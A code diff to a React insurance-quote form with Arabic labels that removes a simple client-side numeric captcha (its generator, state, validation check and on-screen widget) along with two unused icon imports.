@@ -11,10 +11,8 @@ import {
   Tag,
   Wrench,
   Settings2,
-  ShieldCheck,
   Search,
   Loader2,
-  RefreshCw,
 } from "lucide-react";
 import { FullPageLoader } from "@/components/loader";
 import { StepShell } from "@/components/step-shell";
@@ -24,12 +22,6 @@ import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { addData } from "@/lib/firebase";
 import { getSelectedVehicle } from "@/lib/vehicle-api";
 
-function generateCaptcha() {
-  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 10)).join(
-    " ",
-  );
-}
-const CAPTCHA_COLORS = ["#e53935", "#1976d2", "#388e3c", "#f57c00"];
 
 const FIELD_CLASS =
   "w-full h-12 text-right text-sm border border-gray-200 rounded-xl px-4 bg-white focus:border-[#1976d2] focus:outline-none transition-all text-gray-800 font-medium";
@@ -70,13 +62,7 @@ export default function InsurancePage() {
   const [vehicleModel, setVehicleModel] = useState("");
   const [repairLocation, setRepairLocation] = useState("agency");
 
-  // Captcha
-  const [captchaText, setCaptchaText] = useState("3 5 1 9");
-  const [captchaInput, setCaptchaInput] = useState("");
-  const [captchaError, setCaptchaError] = useState(false);
-
   useEffect(() => {
-    setCaptchaText(generateCaptcha());
     // Pre-fill start date with today
     const today = new Date().toISOString().split("T")[0];
     setInsuranceStartDate(today);
@@ -139,11 +125,6 @@ export default function InsurancePage() {
     const valueNum = parseInt(vehicleValue);
     if (valueNum < 10000 || valueNum > 1000000) {
       alert("قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال");
-      return;
-    }
-    const captchaClean = captchaText.replace(/\s/g, "");
-    if (captchaInput !== captchaClean) {
-      setCaptchaError(true);
       return;
     }
     setSubmitting(true);
@@ -348,60 +329,6 @@ export default function InsurancePage() {
           </div>
         </div>
 
-        {/* Captcha */}
-        <div>
-          <div className="flex items-center justify-between mb-1.5">
-            <button
-              type="button"
-              onClick={() => {
-                setCaptchaText(generateCaptcha());
-                setCaptchaInput("");
-                setCaptchaError(false);
-              }}
-              className="text-[#1976d2]"
-            >
-              <RefreshCw className="w-4 h-4" />
-            </button>
-            <label className="flex items-center gap-2 text-sm font-bold text-gray-700">
-              رمز التحقق
-              <ShieldCheck className="w-4 h-4 text-[#1976d2]" />
-            </label>
-          </div>
-          <div className="flex gap-2 items-stretch">
-            <Input
-              type="tel"
-              inputMode="numeric"
-              placeholder="أدخل رمز التحقق"
-              value={captchaInput}
-              onChange={(e) => {
-                setCaptchaInput(e.target.value.replace(/\D/g, "").slice(0, 4));
-                setCaptchaError(false);
-              }}
-              className={`h-12 rounded-xl border text-sm text-center flex-1 ${captchaError ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-[#1976d2]"}`}
-              dir="ltr"
-              required
-            />
-            <div className="h-12 px-4 flex items-center justify-center rounded-xl border-2 border-dashed border-gray-300 bg-gray-50 gap-1.5 select-none min-w-[90px]">
-              {captchaText.split(" ").map((digit, i) => (
-                <span
-                  key={i}
-                  className="text-xl font-black"
-                  style={{
-                    color: CAPTCHA_COLORS[i % CAPTCHA_COLORS.length],
-                    fontFamily: "monospace",
-                  }}
-                >
-                  {digit}
-                </span>
-              ))}
-            </div>
-          </div>
-          {captchaError && (
-            <p className="text-xs text-red-600 mt-1 text-right">
-              ⚠ رمز التحقق غير صحيح
-            </p>
-          )}
-        </div>
 
         {/* Submit */}
         <button
